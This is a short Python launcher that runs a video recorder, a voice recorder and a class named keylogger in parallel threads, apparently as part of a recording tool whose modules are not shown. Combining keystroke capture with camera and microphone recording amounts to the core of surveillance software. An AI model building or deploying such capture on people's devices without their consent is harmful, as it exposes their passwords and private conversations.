import threading
from video_recorder import VideoRecorder
from voice_recorder import VoiceRecorder
from key_logger import keylogger
class main:
    def __init__(self):
        self.video_recorder = VideoRecorder()
        self.voice_recorder = VoiceRecorder()
        self.keylogger = keylogger(self.video_recorder,self.voice_recorder)

        self.record_thread=threading.Thread(target=self.video_recorder.record)
        self.voicerecord_thread=threading.Thread(target=self.voice_recorder.record)
        self.keyboard_thread = threading.Thread(target=self.keylogger.listen)

    def start(self):
        self.record_thread.start()
        self.voicerecord_thread.start()
        self.keyboard_thread.start()

        self.record_thread.join()
        self.voicerecord_thread.join()
        self.keyboard_thread.join()

if __name__ == "__main__":
    main().start()